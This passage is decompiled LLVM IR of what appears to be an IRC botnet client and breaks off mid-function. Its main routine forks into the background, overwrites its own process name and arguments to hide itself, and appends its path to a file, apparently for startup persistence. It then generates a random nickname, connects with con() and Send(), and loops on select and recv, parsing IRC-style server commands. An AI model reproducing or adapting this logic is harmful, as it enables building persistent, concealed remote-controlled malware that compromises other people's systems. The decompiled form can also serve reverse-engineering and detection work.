  %v2_a174 = icmp eq i32 %v3_a16c, 0
  br i1 %v2_a174, label %dec_label_pc_a190, label %dec_label_pc_a17c

dec_label_pc_a17c:                                ; preds = %dec_label_pc_a144
  %v0_a17c = call i32 @__GI___errno_location()
  %v1_a184 = inttoptr i32 %v0_a17c to i32*
  %v2_a184 = load i32, i32* %v1_a184, align 4
  %v7_a188 = icmp eq i32 %v2_a184, 106
  br i1 %v7_a188, label %dec_label_pc_a190, label %dec_label_pc_a200

dec_label_pc_a190:                                ; preds = %dec_label_pc_a17c, %dec_label_pc_a144
  %v2_a194 = load i32, i32* @global_var_26538.34, align 4
  %v5_a1b0 = call i32 @__GI_setsockopt(i32 %v2_a194, i32 1, i32 13, i32 0, i32 0)
  %v2_a1b8 = load i32, i32* @global_var_26538.34, align 4
  %v5_a1d4 = call i32 @__GI_setsockopt(i32 %v2_a1b8, i32 1, i32 2, i32 0, i32 0)
  %v2_a1dc = load i32, i32* @global_var_26538.34, align 4
  %v5_a1f8 = call i32 @__GI_setsockopt(i32 %v2_a1dc, i32 1, i32 9, i32 0, i32 0)
  store i32 %v3_9f98, i32* @fp, align 4
  ret i32 %v5_a1f8

dec_label_pc_a200:                                ; preds = %dec_label_pc_a17c
  %v0_a200 = call i32 @__GI___errno_location()
  %v1_a208 = inttoptr i32 %v0_a200 to i32*
  %v2_a208 = load i32, i32* %v1_a208, align 4
  %v7_a20c = icmp eq i32 %v2_a208, 115
  br i1 %v7_a20c, label %dec_label_pc_a228, label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %dec_label_pc_a200
  %v0_a214 = call i32 @__GI___errno_location()
  %v1_a21c = inttoptr i32 %v0_a214 to i32*
  %v2_a21c = load i32, i32* %v1_a21c, align 4
  %v7_a220 = icmp eq i32 %v2_a21c, 114
  br i1 %v7_a220, label %dec_label_pc_a228, label %dec_label_pc_a250

dec_label_pc_a228:                                ; preds = %dec_label_pc_a214, %dec_label_pc_a200
  %v1_a22c = call i32 @sleep(i32 1)
  br label %dec_label_pc_a230

dec_label_pc_a230:                                ; preds = %dec_label_pc_a0f8, %dec_label_pc_a228
  %v2_a234 = call i32 @__GI_time(i32* null)
  %v2_a244 = sub i32 %v2_a234, %v2_a134
  %tmp = icmp ult i32 %v2_a244, 10
  br i1 %tmp, label %dec_label_pc_a144, label %dec_label_pc_a250

dec_label_pc_a250:                                ; preds = %dec_label_pc_a214, %dec_label_pc_a230
  store i32 0, i32* @global_var_26540.128, align 4
  %v2_a260 = load i32, i32* @global_var_26538.34, align 4
  %v1_a268 = call i32 @__GI___libc_close(i32 %v2_a260)
  br label %dec_label_pc_9fa4.backedge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @__GI___errno_location, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_htons, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_a250, { 1, 0 }
  uselistorder label %dec_label_pc_a230, { 1, 0 }
  uselistorder label %dec_label_pc_a0f8, { 1, 0 }
  uselistorder label %dec_label_pc_9fa4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_9ffc, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-2708 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-394 = alloca i32, align 4
  %stack_var_-1684 = alloca i32, align 4
  %stack_var_-660 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-6804 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 41628, i32* %stack_var_-4, align 4
  %v2_a298 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a298, i32* @fp, align 4
  %v2_a2ac = ptrtoint i32* %stack_var_-24 to i32
  store i32 ptrtoint ([19 x i8]* @global_var_19834.130 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19604.50 to i32), i32* @r1, align 4
  %v3_a2d4 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_19834.130 to i32), i32 ptrtoint (i32* @global_var_19604.50 to i32))
  %v2_a2e4 = icmp eq i32 %v3_a2d4, 0
  br i1 %v2_a2e4, label %dec_label_pc_a2ec, label %dec_label_pc_a308

dec_label_pc_a2ec:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_19848.133 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19604.50 to i32), i32* @r1, align 4
  %v3_a2fc = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_19848.133 to i32), i32 ptrtoint (i32* @global_var_19604.50 to i32))
  br label %dec_label_pc_a308

dec_label_pc_a308:                                ; preds = %entry, %dec_label_pc_a2ec
  %stack_var_-76.0 = phi i32 [ %v3_a2fc, %dec_label_pc_a2ec ], [ %v3_a2d4, %entry ]
  %stack_var_-80.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19848.133, i32 0, i32 0), %dec_label_pc_a2ec ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_19834.130, i32 0, i32 0), %entry ]
  %v2_a30c = icmp eq i32 %stack_var_-76.0, 0
  br i1 %v2_a30c, label %dec_label_pc_a4a4, label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a308
  %v1_a324 = bitcast i8** %argv to i32*
  %v2_a324 = load i32, i32* %v1_a324, align 4
  %v1_a328 = inttoptr i32 %v2_a324 to i8*
  %v3_a32c = call i32 @strlen(i8* %v1_a328)
  %v2_a340 = ptrtoint i32* %stack_var_-344 to i32
  %v2_a34c = call i32 @getcwd(i32 %v2_a340, i32 256)
  store i32 ptrtoint (i32* @global_var_19858.135 to i32), i32* @r1, align 4
  %v2_a35c = bitcast i32* %stack_var_-344 to i8*
  %v3_a35c = call i32 @__GI_strcoll(i8* %v2_a35c, i32 ptrtoint (i32* @global_var_19858.135 to i32))
  %v2_a364 = icmp eq i32 %v3_a35c, 0
  br i1 %v2_a364, label %dec_label_pc_a49c, label %dec_label_pc_a37c

dec_label_pc_a370:                                ; preds = %dec_label_pc_a37c
  %v1_a374 = add i32 %stack_var_-64.0, -1
  br label %dec_label_pc_a37c

dec_label_pc_a37c:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a370
  %stack_var_-64.0 = phi i32 [ %v1_a374, %dec_label_pc_a370 ], [ %v3_a32c, %dec_label_pc_a314 ]
  %v2_a38c = load i32, i32* %v1_a324, align 4
  %v2_a394 = add i32 %v2_a38c, %stack_var_-64.0
  %v1_a398 = inttoptr i32 %v2_a394 to i8*
  %v2_a398 = load i8, i8* %v1_a398, align 1
  %v7_a39c = icmp eq i8 %v2_a398, 47
  br i1 %v7_a39c, label %dec_label_pc_a3a4, label %dec_label_pc_a370

dec_label_pc_a3a4:                                ; preds = %dec_label_pc_a37c
  %v2_a3b4 = load i32, i32* %v1_a324, align 4
  %v2_a3bc = add i32 %v2_a3b4, %stack_var_-64.0
  %v2_a3c0 = ptrtoint i32* %stack_var_-660 to i32
  store i32 %v2_a3c0, i32* @r0, align 4
  %v5_a3d4 = call i32 @sprintf(i32 %v2_a3c0, i32 ptrtoint ([8 x i8]* @global_var_1985c.137 to i32), i32 %v2_a340, i32 %v2_a3bc)
  %v1_a430 = inttoptr i32 %stack_var_-76.0 to i16*
  %v2_a3e4 = ptrtoint i32* %stack_var_-1684 to i32
  %v2_a410 = bitcast i32* %stack_var_-1684 to i8*
  br label %dec_label_pc_a42c.outer

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a42c
  %v3_a3f4 = call i32 @fgets(i32 %v2_a3e4, i32 1024, i32 %stack_var_-76.0)
  %v3_a410 = call i32 @__GI_strcasecmp(i8* %v2_a410, i32 %v2_a3c0)
  %v2_a418 = icmp eq i32 %v3_a410, 0
  br i1 %v2_a418, label %dec_label_pc_a420, label %dec_label_pc_a42c

dec_label_pc_a420:                                ; preds = %dec_label_pc_a3dc
  %v1_a424 = add i32 %stack_var_-60.0.ph, 1
  br label %dec_label_pc_a42c.outer

dec_label_pc_a42c.outer:                          ; preds = %dec_label_pc_a420, %dec_label_pc_a3a4
  %stack_var_-60.0.ph = phi i32 [ %v1_a424, %dec_label_pc_a420 ], [ 0, %dec_label_pc_a3a4 ]
  br label %dec_label_pc_a42c

dec_label_pc_a42c:                                ; preds = %dec_label_pc_a42c.outer, %dec_label_pc_a3dc
  %v2_a430 = call i32 @feof(i16* %v1_a430)
  %v2_a438 = icmp eq i32 %v2_a430, 0
  br i1 %v2_a438, label %dec_label_pc_a3dc, label %dec_label_pc_a440

dec_label_pc_a440:                                ; preds = %dec_label_pc_a42c
  %v2_a444 = icmp eq i32 %stack_var_-60.0.ph, 0
  %v2_a450 = call i32 @__GI_fclose(i16* %v1_a430)
  br i1 %v2_a444, label %dec_label_pc_a44c, label %dec_label_pc_a4a4

dec_label_pc_a44c:                                ; preds = %dec_label_pc_a440
  %v4_a454 = ptrtoint i8* %stack_var_-80.0 to i32
  store i32 %v4_a454, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19864.139 to i32), i32* @r1, align 4
  %v3_a45c = call i32 @__GI_fopen(i32 %v4_a454, i32 ptrtoint (i32* @global_var_19864.139 to i32))
  %v2_a46c = icmp eq i32 %v3_a45c, 0
  br i1 %v2_a46c, label %dec_label_pc_a4a4, label %dec_label_pc_a474

dec_label_pc_a474:                                ; preds = %dec_label_pc_a44c
  %v2_a480 = call i32 @__GI_fputs(i32 %v2_a3c0, i32 %v3_a45c)
  %v1_a488 = inttoptr i32 %v3_a45c to i16*
  %v2_a488 = call i32 @__GI_fclose(i16* %v1_a488)
  br label %dec_label_pc_a4a4

dec_label_pc_a49c:                                ; preds = %dec_label_pc_a314
  %v1_a4a0 = inttoptr i32 %stack_var_-76.0 to i16*
  %v2_a4a0 = call i32 @__GI_fclose(i16* %v1_a4a0)
  br label %dec_label_pc_a4a4

dec_label_pc_a4a4:                                ; preds = %dec_label_pc_a440, %dec_label_pc_a44c, %dec_label_pc_a308, %dec_label_pc_a474, %dec_label_pc_a49c
  %v0_a4a4 = call i32 @__libc_fork()
  %v2_a4ac = icmp eq i32 %v0_a4a4, 0
  br i1 %v2_a4ac, label %dec_label_pc_a4bc, label %dec_label_pc_a4b4

dec_label_pc_a4b4:                                ; preds = %dec_label_pc_a4a4
  %v1_a4b8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %dec_label_pc_a4a4, %dec_label_pc_a4b4
  %v1_a4cc = bitcast i8** %argv to i32*
  %v2_a4cc = load i32, i32* %v1_a4cc, align 4
  store i32 %v2_a4cc, i32* @r4, align 4
  %v2_a4e0 = load i32, i32* %v1_a4cc, align 4
  %v1_a4e4 = inttoptr i32 %v2_a4e0 to i8*
  %v3_a4e8 = call i32 @strlen(i8* %v1_a4e4)
  %v0_a4f0 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19868.141 to i32), i32* @r1, align 4
  %v4_a4fc = call i32 @strncpy(i32 %v0_a4f0, i32 ptrtoint ([6 x i8]* @global_var_19868.141 to i32), i32 %v3_a4e8)
  br label %dec_label_pc_a57c

dec_label_pc_a50c:                                ; preds = %dec_label_pc_a57c
  %v3_a510 = mul i32 %storemerge14, 4
  %v2_a528 = add i32 %v3_a510, %tmp
  %v1_a52c = inttoptr i32 %v2_a528 to i32*
  %v2_a52c = load i32, i32* %v1_a52c, align 4
  store i32 %v2_a52c, i32* @r4, align 4
  %v2_a550 = load i32, i32* %v1_a52c, align 4
  %v1_a554 = inttoptr i32 %v2_a550 to i8*
  %v3_a558 = call i32 @strlen(i8* %v1_a554)
  %v0_a560 = load i32, i32* @r4, align 4
  %v3_a56c = inttoptr i32 %v0_a560 to i8*
  %v4_a56c = call i32 @__GI_memset(i8* %v3_a56c, i32 0, i32 %v3_a558)
  %v1_a574 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_a57c

dec_label_pc_a57c:                                ; preds = %dec_label_pc_a4bc, %dec_label_pc_a50c
  %storemerge14 = phi i32 [ 1, %dec_label_pc_a4bc ], [ %v1_a574, %dec_label_pc_a50c ]
  %v5_a594 = icmp slt i32 %storemerge14, %argc
  br i1 %v5_a594, label %dec_label_pc_a50c, label %dec_label_pc_a598

dec_label_pc_a598:                                ; preds = %dec_label_pc_a57c
  %v2_a59c = call i32 @__GI_time(i32* null)
  %v0_a5a4 = call i32 @__getpid()
  store i32 %v0_a5a4, i32* @r0, align 4
  %v2_a5ac = xor i32 %v2_a59c, %v0_a5a4
  store i32 %v2_a5ac, i32* @r4, align 4
  %v0_a5b0 = call i32 @getppid()
  %v0_a5b8 = load i32, i32* @r4, align 4
  %v2_a5b8 = add i32 %v0_a5b8, %v0_a5b0
  %v1_a5c0 = call i32 @srand(i32 %v2_a5b8)
  %v1_a5cc = call i32 @makestring(i32 %v1_a5c0)
  %v2_a5dc = ptrtoint i32* %stack_var_-394 to i32
  store i32 ptrtoint (i32* @global_var_19810.118 to i32), i32* @r1, align 4
  %v2_a5e8 = bitcast i32* %stack_var_-394 to i8*
  %v3_a5e8 = call i32 @strcpy(i8* %v2_a5e8, i32 ptrtoint (i32* @global_var_19810.118 to i32))
  store i32 %v1_a5cc, i32* @r1, align 4
  %v3_a5fc = call i32 @strcat(i8* %v2_a5e8, i32 %v1_a5cc)
  store i32 %v2_a5dc, i32* @global_var_26534.88, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19870.146 to i32), i32* @global_var_2652c.54, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_19874.150 to i32), i32* @global_var_2653c.148, align 4
  store i32 ptrtoint (i32* @global_var_19880.153 to i32), i32* @global_var_2654c.58, align 4
  store i32 ptrtoint (i32* @global_var_19810.118 to i32), i32* @global_var_26548.98, align 4
  store i32 ptrtoint (i32* @global_var_19810.118 to i32), i32* @global_var_26530.156, align 4
  store i32 0, i32* @global_var_26540.128, align 4
  %v2_a6b4 = ptrtoint i32* %stack_var_-660 to i32
  %v2_a774 = ptrtoint i32* %stack_var_-404 to i32
  %v2_a98c = ptrtoint i32* %stack_var_-6804 to i32
  %v2_aa88 = ptrtoint i32* %stack_var_-2708 to i32
  %v2_aa94 = bitcast i32* %stack_var_-2708 to i8*
  %v2_ab44 = ptrtoint i32* %stack_var_-1684 to i32
  %v3_ab50 = bitcast i32* %stack_var_-1684 to i8*
  br label %dec_label_pc_a658

dec_label_pc_a658:                                ; preds = %dec_label_pc_a97c, %dec_label_pc_a6f0, %dec_label_pc_ac14, %dec_label_pc_a598
  %v0_a658 = call i32 @con()
  %v2_a660 = load i32, i32* @global_var_26538.34, align 4
  %v2_a668 = load i32, i32* @global_var_26530.156, align 4
  %v4_a678 = call i32 @Send(i32 %v2_a660, i32 ptrtoint ([9 x i8]* @global_var_19884.160 to i32), i32 %v2_a668)
  %v2_a680 = load i32, i32* @global_var_26538.34, align 4
  %v2_a688 = load i32, i32* @global_var_26534.88, align 4
  %v2_a690 = load i32, i32* @global_var_2652c.54, align 4
  store i32 %v2_a690, i32* @lr, align 4
  %v4_a6b0 = call i32 @Send(i32 %v2_a680, i32 ptrtoint ([41 x i8]* @global_var_19890.162 to i32), i32 %v2_a688)
  br label %dec_label_pc_a6c8.lr.ph

dec_label_pc_a6c8.lr.ph:                          ; preds = %dec_label_pc_a934, %dec_label_pc_a9b8, %dec_label_pc_ac38, %dec_label_pc_ac58, %dec_label_pc_a658
  br label %dec_label_pc_a6c8

dec_label_pc_a6c8:                                ; preds = %dec_label_pc_a6c8.lr.ph, %dec_label_pc_a6c8
  %storemerge1529 = phi i32 [ 0, %dec_label_pc_a6c8.lr.ph ], [ %v1_a6dc, %dec_label_pc_a6c8 ]
  %v5_a6d4 = mul nuw nsw i32 %storemerge1529, 4
  %v6_a6d4 = add i32 %v5_a6d4, %v2_a6b4
  %v7_a6d4 = inttoptr i32 %v6_a6d4 to i32*
  store i32 0, i32* %v7_a6d4, align 4
  %v1_a6dc = add nuw nsw i32 %storemerge1529, 1
  %tmp78 = icmp ult i32 %v1_a6dc, 32
  br i1 %tmp78, label %dec_label_pc_a6c8, label %dec_label_pc_a6f0

dec_label_pc_a6f0:                                ; preds = %dec_label_pc_a6c8
  %v2_a6f4 = load i32, i32* @global_var_26538.34, align 4
  %v3_a6f8 = udiv i32 %v2_a6f4, 32
  %v3_a70c = mul nuw nsw i32 %v3_a6f8, 4
  %v2_a714 = add i32 %v3_a70c, %v2_a2ac
  %v2_a718 = add i32 %v2_a714, -636
  %v1_a71c = inttoptr i32 %v2_a718 to i32*
  %v2_a71c = load i32, i32* %v1_a71c, align 4
  %v1_a728 = urem i32 %v2_a6f4, 32
  %v6_a730 = shl i32 1, %v1_a728
  %v2_a734 = or i32 %v2_a71c, %v6_a730
  store i32 %v2_a734, i32* %v1_a71c, align 4
  store i32 1200, i32* %stack_var_-404, align 4
  %v2_a768 = load i32, i32* @global_var_26538.34, align 4
  %v1_a76c = add i32 %v2_a768, 1
  %v5_a788 = call i32 @__libc_select(i32 %v1_a76c, i32 %v2_a6b4, i32 0, i32 0, i32 %v2_a774)
  %tmp79 = icmp slt i32 %v5_a788, 1
  br i1 %tmp79, label %dec_label_pc_a658, label %dec_label_pc_a920.preheader

dec_label_pc_a920.preheader:                      ; preds = %dec_label_pc_a6f0
  %v2_a924109 = load i32, i32* @global_var_23464.43, align 4
  %v3_a92c111 = icmp eq i32 %v2_a924109, 0
  br i1 %v3_a92c111, label %dec_label_pc_a934, label %dec_label_pc_a7a4

dec_label_pc_a7a4:                                ; preds = %dec_label_pc_a914, %dec_label_pc_a920.preheader
  %storemerge16118 = phi i32 [ %.pre136, %dec_label_pc_a914 ], [ 0, %dec_label_pc_a920.preheader ]
  %v3_a7a8 = mul i32 %storemerge16118, 4
  %v2_a7b4 = load i32, i32* @global_var_26550.45, align 4
  %v2_a7b8 = add i32 %v2_a7b4, %v3_a7a8
  %v1_a7bc = inttoptr i32 %v2_a7b8 to i32*
  %v2_a7bc = load i32, i32* %v1_a7bc, align 4
  %v3_a7cc = call i32 @__libc_waitpid(i32 %v2_a7bc, i32 0, i32 1)
  %tmp80 = icmp slt i32 %v3_a7cc, 1
  %.pre136 = add i32 %storemerge16118, 1
  br i1 %tmp80, label %dec_label_pc_a914, label %dec_label_pc_a830.preheader

dec_label_pc_a830.preheader:                      ; preds = %dec_label_pc_a7a4
  %v2_a83488 = load i32, i32* @global_var_23464.43, align 4
  %v3_a83c90 = icmp ult i32 %.pre136, %v2_a83488
  %v2_a84891 = load i32, i32* @global_var_26550.45, align 4
  %v1_a84c92 = add i32 %v2_a84891, -4
  %v3_a85493 = mul i32 %.pre136, 4
  %v2_a85894 = add i32 %v1_a84c92, %v3_a85493
  br i1 %v3_a83c90, label %dec_label_pc_a7ec, label %dec_label_pc_a844

dec_label_pc_a7ec:                                ; preds = %dec_label_pc_a830.preheader, %dec_label_pc_a7ec
  %v2_a85898 = phi i32 [ %v2_a858, %dec_label_pc_a7ec ], [ %v2_a85894, %dec_label_pc_a830.preheader ]
  %v3_a85497 = phi i32 [ %v3_a854, %dec_label_pc_a7ec ], [ %v3_a85493, %dec_label_pc_a830.preheader ]
  %v2_a84896 = phi i32 [ %v2_a848, %dec_label_pc_a7ec ], [ %v2_a84891, %dec_label_pc_a830.preheader ]
  %v1_a7e095 = phi i32 [ %v1_a7e0, %dec_label_pc_a7ec ], [ %.pre136, %dec_label_pc_a830.preheader ]
  %v2_a818 = add i32 %v2_a84896, %v3_a85497
  %v1_a81c = inttoptr i32 %v2_a818 to i32*
  %v2_a81c = load i32, i32* %v1_a81c, align 4
  %v2_a820 = inttoptr i32 %v2_a85898 to i32*
  store i32 %v2_a81c, i32* %v2_a820, align 4
  %v1_a7e0 = add i32 %v1_a7e095, 1
  %v2_a834 = load i32, i32* @global_var_23464.43, align 4
  %v3_a83c = icmp ult i32 %v1_a7e0, %v2_a834
  %v2_a848 = load i32, i32* @global_var_26550.45, align 4
  %v1_a84c = add i32 %v2_a848, -4
  %v3_a854 = mul i32 %v1_a7e0, 4
  %v2_a858 = add i32 %v1_a84c, %v3_a854
  br i1 %v3_a83c, label %dec_label_pc_a7ec, label %dec_label_pc_a830.dec_label_pc_a844_crit_edge

dec_label_pc_a830.dec_label_pc_a844_crit_edge:    ; preds = %dec_label_pc_a7ec
  br label %dec_label_pc_a844

dec_label_pc_a844:                                ; preds = %dec_label_pc_a830.dec_label_pc_a844_crit_edge, %dec_label_pc_a830.preheader
  %v2_a858.lcssa = phi i32 [ %v2_a858, %dec_label_pc_a830.dec_label_pc_a844_crit_edge ], [ %v2_a85894, %dec_label_pc_a830.preheader ]
  %v2_a860 = inttoptr i32 %v2_a858.lcssa to i32*
  store i32 0, i32* %v2_a860, align 4
  %v2_a868 = load i32, i32* @global_var_23464.43, align 4
  %v1_a86c = add i32 %v2_a868, -1
  store i32 %v1_a86c, i32* @global_var_23464.43, align 4
  %v3_a884 = mul i32 %v2_a868, 4
  %v1_a88c = call i32 @malloc(i32 %v3_a884)
  %v2_a8e8102 = load i32, i32* @global_var_23464.43, align 4
  %v3_a8f0104 = icmp eq i32 %v2_a8e8102, 0
  br i1 %v3_a8f0104, label %dec_label_pc_a8f8, label %dec_label_pc_a8a4

dec_label_pc_a8a4:                                ; preds = %dec_label_pc_a844, %dec_label_pc_a8a4
  %storemerge18105 = phi i32 [ %v1_a8dc, %dec_label_pc_a8a4 ], [ 0, %dec_label_pc_a844 ]
  %v3_a8a8 = mul i32 %storemerge18105, 4
  %v2_a8b4 = add i32 %v3_a8a8, %v1_a88c
  %v2_a8c8 = load i32, i32* @global_var_26550.45, align 4
  %v2_a8cc = add i32 %v2_a8c8, %v3_a8a8
  %v1_a8d0 = inttoptr i32 %v2_a8cc to i32*
  %v2_a8d0 = load i32, i32* %v1_a8d0, align 4
  %v2_a8d4 = inttoptr i32 %v2_a8b4 to i32*
  store i32 %v2_a8d0, i32* %v2_a8d4, align 4
  %v1_a8dc = add i32 %storemerge18105, 1
  %v2_a8e8 = load i32, i32* @global_var_23464.43, align 4
  %v3_a8f0 = icmp ult i32 %v1_a8dc, %v2_a8e8
  br i1 %v3_a8f0, label %dec_label_pc_a8a4, label %dec_label_pc_a8e4.dec_label_pc_a8f8_crit_edge

dec_label_pc_a8e4.dec_label_pc_a8f8_crit_edge:    ; preds = %dec_label_pc_a8a4
  br label %dec_label_pc_a8f8

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a844, %dec_label_pc_a8e4.dec_label_pc_a8f8_crit_edge
  %v2_a8fc = load i32, i32* @global_var_26550.45, align 4
  store i32 %v2_a8fc, i32* @r0, align 4
  %v0_a904 = call i32 @free()
  store i32 %v1_a88c, i32* @global_var_26550.45, align 4
  br label %dec_label_pc_a914

dec_label_pc_a914:                                ; preds = %dec_label_pc_a7a4, %dec_label_pc_a8f8
  %v2_a924 = load i32, i32* @global_var_23464.43, align 4
  %v3_a92c = icmp ult i32 %.pre136, %v2_a924
  br i1 %v3_a92c, label %dec_label_pc_a7a4, label %dec_label_pc_a934

dec_label_pc_a934:                                ; preds = %dec_label_pc_a914, %dec_label_pc_a920.preheader
  %v2_a938 = load i32, i32* @global_var_26538.34, align 4
  %v3_a93c = udiv i32 %v2_a938, 32
  %v3_a948 = mul nuw nsw i32 %v3_a93c, 4
  %v2_a950 = add i32 %v3_a948, %v2_a2ac
  %v2_a954 = add i32 %v2_a950, -636
  %v1_a958 = inttoptr i32 %v2_a954 to i32*
  %v2_a958 = load i32, i32* %v1_a958, align 4
  %v1_a964 = urem i32 %v2_a938, 32
  %v6_a9684 = lshr i32 %v2_a958, %v1_a964
  %v1_a970 = urem i32 %v6_a9684, 2
  %v2_a974 = icmp eq i32 %v1_a970, 0
  br i1 %v2_a974, label %dec_label_pc_a6c8.lr.ph, label %dec_label_pc_a97c

dec_label_pc_a97c:                                ; preds = %dec_label_pc_a934
  %v4_a9a0 = call i32 @__libc_recv(i32 %v2_a938, i32 %v2_a98c, i32 4096, i32 0)
  %tmp81 = icmp slt i32 %v4_a9a0, 1
  br i1 %tmp81, label %dec_label_pc_a658, label %dec_label_pc_a9b8

dec_label_pc_a9b8:                                ; preds = %dec_label_pc_a97c
  %v2_a9cc = add i32 %v4_a9a0, %v2_a98c
  %v3_a9cc = inttoptr i32 %v2_a9cc to i8*
  store i8 0, i8* %v3_a9cc, align 1
  store i32 %v2_a98c, i32* @r0, align 4
  %v6_a9ec = call i32 @__GI_strtok(i32 %v2_a98c, i32 ptrtoint (i32* @global_var_198bc.166 to i32), i32 %v2_a9cc, i32 %v2_a98c, i32 %v4_a9a0)
  %v2_ac5032 = icmp eq i32 %v6_a9ec, 0
  br i1 %v2_ac5032, label %dec_label_pc_a6c8.lr.ph, label %dec_label_pc_ac58

dec_label_pc_a9fc:                                ; preds = %dec_label_pc_ac58
  %v3_aa00 = call i32 @filter(i8* nonnull %storemerge34)
  %v2_aa08 = load i8, i8* %storemerge34, align 1
  %v7_aa0c = icmp eq i8 %v2_aa08, 58
  br i1 %v7_aa0c, label %dec_label_pc_aa2c, label %dec_label_pc_aabc

dec_label_pc_aa20:                                ; preds = %dec_label_pc_aa44
  %v1_aa24 = add i32 %storemerge23, 1
  br label %dec_label_pc_aa2c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_a9fc, %dec_label_pc_aa20
  %storemerge23 = phi i32 [ %v1_aa24, %dec_label_pc_aa20 ], [ 0, %dec_label_pc_a9fc ]
  %v3_aa34 = call i32 @strlen(i8* %storemerge34)
  %v3_aa3c = icmp ult i32 %storemerge23, %v3_aa34
  br i1 %v3_aa3c, label %dec_label_pc_aa44, label %dec_label_pc_aa2c.dec_label_pc_aa60_crit_edge

dec_label_pc_aa2c.dec_label_pc_aa60_crit_edge:    ; preds = %dec_label_pc_aa2c
  %.pre = add i32 %storemerge23, %storemerge34.in
  %.pre35 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_aa60

dec_label_pc_aa44:                                ; preds = %dec_label_pc_aa2c
  %v2_aa50 = add i32 %storemerge23, %storemerge34.in
  %v1_aa54 = inttoptr i32 %v2_aa50 to i8*
  %v2_aa54 = load i8, i8* %v1_aa54, align 1
  %v7_aa58 = icmp eq i8 %v2_aa54, 32
  br i1 %v7_aa58, label %dec_label_pc_aa60, label %dec_label_pc_aa20

dec_label_pc_aa60:                                ; preds = %dec_label_pc_aa44, %dec_label_pc_aa2c.dec_label_pc_aa60_crit_edge
  %v3_aa74.pre-phi = phi i8* [ %.pre35, %dec_label_pc_aa2c.dec_label_pc_aa60_crit_edge ], [ %v1_aa54, %dec_label_pc_aa44 ]
  %v2_aa6c.pre-phi = phi i32 [ %.pre, %dec_label_pc_aa2c.dec_label_pc_aa60_crit_edge ], [ %v2_aa50, %dec_label_pc_aa44 ]
  store i8 0, i8* %v3_aa74.pre-phi, align 1
  %v1_aa7c = add i32 %storemerge34.in, 1
  store i32 %v1_aa7c, i32* @r1, align 4
  %v3_aa94 = call i32 @strcpy(i8* %v2_aa94, i32 %v1_aa7c)
  %v1_aaa8 = add i32 %v2_aa6c.pre-phi, 1
  store i32 %v1_aaa8, i32* @r1, align 4
  %v4_aab4 = call i32 @strcpy(i8* %storemerge34, i32 %v1_aaa8)
  br label %dec_label_pc_aad8

dec_label_pc_aabc:                                ; preds = %dec_label_pc_a9fc
  store i32 %v2_aa88, i32* @r3, align 4
  store i32 %v2_aa88, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_198c0.168 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  %v0_aad4 = call i32 @memcpy()
  br label %dec_label_pc_aad8

dec_label_pc_aad8:                                ; preds = %dec_label_pc_aa60, %dec_label_pc_aabc
  br label %dec_label_pc_aaf0

dec_label_pc_aae4:                                ; preds = %dec_label_pc_ab08
  %v1_aae8 = add i32 %storemerge20, 1
  br label %dec_label_pc_aaf0

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_aad8, %dec_label_pc_aae4
  %storemerge20 = phi i32 [ 0, %dec_label_pc_aad8 ], [ %v1_aae8, %dec_label_pc_aae4 ]
  store i32 %storemerge20, i32* @r4, align 4
  %v3_aaf8 = call i32 @strlen(i8* %storemerge34)
  %v0_ab00 = load i32, i32* @r4, align 4
  %v3_ab00 = icmp ult i32 %v0_ab00, %v3_aaf8
  br i1 %v3_ab00, label %dec_label_pc_ab08, label %dec_label_pc_aaf0.dec_label_pc_ab24_crit_edge

dec_label_pc_aaf0.dec_label_pc_ab24_crit_edge:    ; preds = %dec_label_pc_aaf0
  %.pre36 = add i32 %storemerge20, %storemerge34.in
  %.pre37 = inttoptr i32 %.pre36 to i8*
  br label %dec_label_pc_ab24

dec_label_pc_ab08:                                ; preds = %dec_label_pc_aaf0
  %v2_ab14 = add i32 %storemerge20, %storemerge34.in
  %v1_ab18 = inttoptr i32 %v2_ab14 to i8*
  %v2_ab18 = load i8, i8* %v1_ab18, align 1
  %v7_ab1c = icmp eq i8 %v2_ab18, 32
  br i1 %v7_ab1c, label %dec_label_pc_ab24, label %dec_label_pc_aae4

